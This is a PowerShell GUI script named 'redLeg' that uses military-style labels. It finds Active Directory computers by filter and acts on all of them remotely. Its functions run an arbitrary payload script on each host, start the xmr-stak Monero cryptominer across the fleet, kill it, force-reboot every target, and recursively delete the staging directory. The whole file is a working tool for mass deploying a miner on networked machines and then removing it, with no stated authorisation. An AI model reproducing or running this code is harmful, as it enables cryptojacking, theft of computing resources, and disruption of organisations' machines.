# Set Global Variables

$fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
$missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
$logoASCIIredLeg = "
▄▄▄  ▄▄▄ .·▄▄▄▄  ▄▄▌  ▄▄▄ . ▄▄ • 
▀▄ █·▀▄.▀·██▪ ██ ██•  ▀▄.▀·▐█ ▀ ▪
▐▀▀▄ ▐▀▀▪▄▐█· ▐█▌██▪  ▐▀▀▪▄▄█ ▀█▄
▐█•█▌▐█▄▄▌██. ██ ▐█▌▐▌▐█▄▄▌▐█▄▪▐█
.▀  ▀ ▀▀▀ ▀▀▀▀▀• .▀▀▀  ▀▀▀ ·▀▀▀▀ 
"
$logoASCIIfireMission = "
·▄▄▄▪  ▄▄▄  ▄▄▄ .                     
▐▄▄·██ ▀▄ █·▀▄.▀·                     
██▪ ▐█·▐▀▀▄ ▐▀▀▪▄                     
██▌.▐█▌▐█•█▌▐█▄▄▌                     
▀▀▀ ▀▀▀.▀  ▀ ▀▀▀                      
• ▌ ▄ ·. ▪  .▄▄ · .▄▄ · ▪         ▐ ▄ 
·██ ▐███▪██ ▐█ ▀. ▐█ ▀. ██ ▪     •█▌▐█
▐█ ▌▐▌▐█·▐█·▄▀▀▀█▄▄▀▀▀█▄▐█· ▄█▀▄ ▐█▐▐▌
██ ██▌▐█▌▐█▌▐█▄▪▐█▐█▄▪▐█▐█▌▐█▌.▐▌██▐█▌
▀▀  █▪▀▀▀▀▀▀ ▀▀▀▀  ▀▀▀▀ ▀▀▀ ▀█▄▀▪▀▀ █▪
"
$logoASCIIfireBase = "
·▄▄▄▪  ▄▄▄  ▄▄▄ .      
▐▄▄·██ ▀▄ █·▀▄.▀·      
██▪ ▐█·▐▀▀▄ ▐▀▀▪▄      
██▌.▐█▌▐█•█▌▐█▄▄▌      
▀▀▀ ▀▀▀.▀  ▀ ▀▀▀       
▄▄▄▄·  ▄▄▄· .▄▄ · ▄▄▄ .
▐█ ▀█▪▐█ ▀█ ▐█ ▀. ▀▄.▀·
▐█▀▀█▄▄█▀▀█ ▄▀▀▀█▄▐▀▀▪▄
██▄▪▐█▐█ ▪▐▌▐█▄▪▐█▐█▄▄▌
·▀▀▀▀  ▀  ▀  ▀▀▀▀  ▀▀▀ 
"
$logoASCIIgridCheck = "
 ▄▄ • ▄▄▄  ▪  ·▄▄▄▄      
▐█ ▀ ▪▀▄ █·██ ██▪ ██     
▄█ ▀█▄▐▀▀▄ ▐█·▐█· ▐█▌    
▐█▄▪▐█▐█•█▌▐█▌██. ██     
·▀▀▀▀ .▀  ▀▀▀▀▀▀▀▀▀•     
 ▄▄·  ▄ .▄▄▄▄ . ▄▄· ▄ •▄ 
▐█ ▌▪██▪▐█▀▄.▀·▐█ ▌▪█▌▄▌▪
██ ▄▄██▀▐█▐▀▀▪▄██ ▄▄▐▀▀▄·
▐███▌██▌▐▀▐█▄▄▌▐███▌▐█.█▌
·▀▀▀ ▀▀▀ · ▀▀▀ ·▀▀▀ ·▀  ▀
"
$logoASCIImoveOut = "
• ▌ ▄ ·.        ▌ ▐·▄▄▄ .      ▄• ▄▌▄▄▄▄▄
·██ ▐███▪▪     ▪█·█▌▀▄.▀·▪     █▪██▌•██  
▐█ ▌▐▌▐█· ▄█▀▄ ▐█▐█•▐▀▀▪▄ ▄█▀▄ █▌▐█▌ ▐█.▪
██ ██▌▐█▌▐█▌.▐▌ ███ ▐█▄▄▌▐█▌.▐▌▐█▄█▌ ▐█▌·
▀▀  █▪▀▀▀ ▀█▄▀▪. ▀   ▀▀▀  ▀█▄▀▪ ▀▀▀  ▀▀▀ 
"
$logoASCIIreinitGunline = "
▄▄▄  ▄▄▄ .▪   ▐ ▄ ▪  ▄▄▄▄▄        
▀▄ █·▀▄.▀·██ •█▌▐███ •██          
▐▀▀▄ ▐▀▀▪▄▐█·▐█▐▐▌▐█· ▐█.▪        
▐█•█▌▐█▄▄▌▐█▌██▐█▌▐█▌ ▐█▌·        
.▀  ▀ ▀▀▀ ▀▀▀▀▀ █▪▀▀▀ ▀▀▀         
 ▄▄ • ▄• ▄▌ ▐ ▄ ▄▄▌  ▪   ▐ ▄ ▄▄▄ .
▐█ ▀ ▪█▪██▌•█▌▐███•  ██ •█▌▐█▀▄.▀·
▄█ ▀█▄█▌▐█▌▐█▐▐▌██▪  ▐█·▐█▐▐▌▐▀▀▪▄
▐█▄▪▐█▐█▄█▌██▐█▌▐█▌▐▌▐█▌██▐█▌▐█▄▄▌
·▀▀▀▀  ▀▀▀ ▀▀ █▪.▀▀▀ ▀▀▀▀▀ █▪ ▀▀▀ 
"
$logoASCIIclearBreach = "
 ▄▄· ▄▄▌  ▄▄▄ . ▄▄▄· ▄▄▄        
▐█ ▌▪██•  ▀▄.▀·▐█ ▀█ ▀▄ █·      
██ ▄▄██▪  ▐▀▀▪▄▄█▀▀█ ▐▀▀▄       
▐███▌▐█▌▐▌▐█▄▄▌▐█ ▪▐▌▐█•█▌      
·▀▀▀ .▀▀▀  ▀▀▀  ▀  ▀ .▀  ▀      
▄▄▄▄· ▄▄▄  ▄▄▄ . ▄▄▄·  ▄▄·  ▄ .▄
▐█ ▀█▪▀▄ █·▀▄.▀·▐█ ▀█ ▐█ ▌▪██▪▐█
▐█▀▀█▄▐▀▀▄ ▐▀▀▪▄▄█▀▀█ ██ ▄▄██▀▐█
██▄▪▐█▐█•█▌▐█▄▄▌▐█ ▪▐▌▐███▌██▌▐▀
·▀▀▀▀ .▀  ▀ ▀▀▀  ▀  ▀ ·▀▀▀ ▀▀▀ ·
"

# Function Definitions

function fireBase {

$opsDir = $missionParameters.ops
$filterTarget = $missionParameters.Target
$advanceParty = $missionParameters.ap
$searchbase = $missionParameters.search
$hostList = $searchbase | ForEach-Object { Get-ADComputer -Filter "Name -like '$filterTarget'" -SearchBase $_.distinguishedname } | Select-Object Name
foreach ($client in $hostList.Name)

{

$counter++
[Int]$Percentage = ($counter/$hostList.count)*100
$ProgressBar.Value = $Percentage
$cmdstring = "invoke-command -computername $client -FilePath $advanceParty"
$scriptblock = [scriptblock]::Create($cmdstring)
Start-Process powershell -ArgumentList "-noexit -command $Scriptblock"

}
}

function fireMission {

$searchbase = $missionParameters.search
$filterTarget = $missionParameters.Target
$opsDir = $missionParameters.ops
$hostList = $searchbase | ForEach-Object { Get-ADComputer -Filter "Name -like '$filterTarget'" -SearchBase $_.distinguishedname } | Select-Object Name
foreach ($client in $hostList.Name)

{

$counter++
[Int]$Percentage = ($counter/$hostList.count)*100
$ProgressBar.Value = $Percentage
$cmdstring = "invoke-command -computername $client -scriptblock {write-host 'I am' $client ; & ‘$opsDir\xmr-stak-win64\xmr-stak.exe’ -c '$opsDir\xmr-stak-win64\config.txt' -C '$opsDir\xmr-stak-win64\pools.txt'}"
$scriptblock = [scriptblock]::Create($cmdstring)
Start-Process powershell -ArgumentList "-noexit -command  $Scriptblock"

}
}

function clearBreach {

$searchbase = $missionParameters.search
$filterTarget = $missionParameters.Target
$opsDir = $missionParameters.ops
$hostList = $searchbase | ForEach-Object { Get-ADComputer -Filter "Name -like '$filterTarget'" -SearchBase $_.distinguishedname } | Select-Object Name
foreach ($client in $hostList.Name)

{

$counter++
[Int]$Percentage = ($counter/$hostList.count)*100
$ProgressBar.Value = $Percentage
Invoke-Command -ComputerName $client -ScriptBlock { Stop-Process -Name xmr-stak }
$outputPane.text = "$client - Clearing Breach..."

}

Get-Process -Name powershell | Where-Object -FilterScript { $_.Id -ne $PID } | Stop-Process -Passthru
$outputPane.text = "Breaches CLEAR!"
}

function reinitGunline {

$filterTarget = $missionParameters.Target
$searchbase = $missionParameters.search
$hostList = $searchbase | ForEach-Object { Get-ADComputer -Filter "Name -like '$filterTarget'" -SearchBase $_.distinguishedname } | Select-Object Name
foreach ($client in $hostList.Name)

{

$counter++
[Int]$Percentage = ($counter/$hostList.count)*100
$ProgressBar.Value = $Percentage
$outputPane.Text = "Sending command to $client..."
Restart-Computer -ComputerName $client -Force

}

Get-Process -Name powershell | Where-Object -FilterScript { $_.Id -ne $PID } | Stop-Process -Passthru

}

function gridCheck {
$searchbase = $missionParameters.search.DistinguishedName
$searchOU = $missionParameters.search.Name
$filterTarget = $missionParameters.Target
$opsDir = $missionParameters.ops
$advanceParty = $missionParameters.ap
$payload = $missionParameters.payload
$outputPane.text = "Mission Parameters:`n`nSearch Base: $searchBase`n`nSelected OU(s): $searchOU`n`nFilter Target: $filterTarget`n`nOperations Directory: $opsDir`n`nPayload Path: $payload`n`nAdvance Party: $advanceParty"
}

function moveOut {

$searchbase = $missionParameters.search
$filterTarget = $missionParameters.Target
$opsDir = $missionParameters.ops
$hostList = $searchbase | ForEach-Object { Get-ADComputer -Filter "Name -like '$filterTarget'" -SearchBase $_.distinguishedname } | Select-Object Name
foreach ($client in $hostList.Name)

{

$counter++
[Int]$Percentage = ($counter/$hostList.count)*100
$ProgressBar.Value = $Percentage
$cmdstring = “invoke-command -computername $client -scriptblock { If(test-path $opsDir) { write-host $client ‘Operations Directory = REMOVED’ ; Remove-Item -path $opsDir -Recurse -Force } Else { write-host 'Operations Directory = NON-EXISTANT' }}”
$scriptblock = [scriptblock]::Create($cmdstring)
Start-Process powershell -ArgumentList "-noexit -command $Scriptblock"

}
}

function showFireBase { $outputPane.text = $logoASCIIfireBase }

function showFireMission { $outputPane.text = $logoASCIIfireMission }

function showClearBreach { $outputPane.text = $logoASCIIclearBreach }

function showReinitGunline { $outputPane.text = $logoASCIIreinitGunline }

function showGridCheck { $outputPane.text = $logoASCIIgridCheck }

function showMoveOut { $outputPane.text = $logoASCIImoveOut }

Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.Application]::EnableVisualStyles()

#region begin GUI{ 

$redLeg                          = New-Object system.Windows.Forms.Form
$redLeg.ClientSize               = '600,400'
$redLeg.text                     = "redLeg - fireDirectionalControl"
$redLeg.TopMost                  = $false

$fireMission                     = New-Object system.Windows.Forms.Button
$fireMission.text                = "FIRE"
$fireMission.width               = 90
$fireMission.height              = 30
$fireMission.location            = New-Object System.Drawing.Point(40,90)
$fireMission.Font                = 'Microsoft Sans Serif,10'

$fireBase                        = New-Object system.Windows.Forms.Button
$fireBase.text                   = "BASE"
$fireBase.width                  = 90
$fireBase.height                 = 30
$fireBase.location               = New-Object System.Drawing.Point(40,40)
$fireBase.Font                   = 'Microsoft Sans Serif,10'

$clearBreach                     = New-Object system.Windows.Forms.Button
$clearBreach.text                = "CLEAR"
$clearBreach.width               = 90
$clearBreach.height              = 30
$clearBreach.location            = New-Object System.Drawing.Point(40,140)
$clearBreach.Font                = 'Microsoft Sans Serif,10'

$moveOut                         = New-Object system.Windows.Forms.Button
$moveOut.text                    = "OUT"
$moveOut.width                   = 90
$moveOut.height                  = 30
$moveOut.location                = New-Object System.Drawing.Point(40,290)
$moveOut.Font                    = 'Microsoft Sans Serif,10'

$progressBar                     = New-Object system.Windows.Forms.ProgressBar
$progressBar.width               = 515
$progressBar.height              = 20
$progressBar.location            = New-Object System.Drawing.Point(49,351)

$reinitGunline                   = New-Object system.Windows.Forms.Button
$reinitGunline.text              = "INITALIZE"
$reinitGunline.width             = 90
$reinitGunline.height            = 30
$reinitGunline.location          = New-Object System.Drawing.Point(40,190)
$reinitGunline.Font              = 'Microsoft Sans Serif,10'

$gridCheck                       = New-Object system.Windows.Forms.Button
$gridCheck.text                  = "CHECK"
$gridCheck.width                 = 90
$gridCheck.height                = 30
$gridCheck.location              = New-Object System.Drawing.Point(40,240)
$gridCheck.Font                  = 'Microsoft Sans Serif,10'

$outputPane                      = New-Object system.Windows.Forms.Label
$outputPane.text                 = $logoASCIIredLeg
$outputPane.AutoSize             = $false
$outputPane.width                = 380
$outputPane.height               = 270
$outputPane.location             = New-Object System.Drawing.Point(170,45)
$outputPane.Font                 = 'Courier,8'

$redLeg.controls.AddRange(@($fireMission,$fireBase,$clearBreach,$moveOut,$progressBar,$reinitGunline,$gridCheck,$outputPane))

#region gui events {
$fireBase.Add_Click({ fireBase })
$fireMission.Add_Click({ fireMission })
$clearBreach.Add_Click({ clearBreach })
$reinitGunline.Add_Click({ reinitGunline })
$moveOut.Add_Click({ [System.Windows.Forms.MessageBox]::Show("Breaking Down The Firebase`nMoving Out..." , "Confirm Entry") ; moveOut })
$gridCheck.Add_Click({ gridCheck })
$fireBase.Add_MouseEnter({ showFireBase })
$fireMission.Add_MouseEnter({ showFireMission })
$clearBreach.Add_MouseEnter({ showClearBreach })
$reinitGunline.Add_MouseEnter({ showReinitGunline })
$gridCheck.Add_MouseEnter({ showGridCheck })
$moveOut.Add_MouseEnter({ showMoveOut })
#endregion events }

#endregion GUI }

[void]$redLeg.ShowDialog()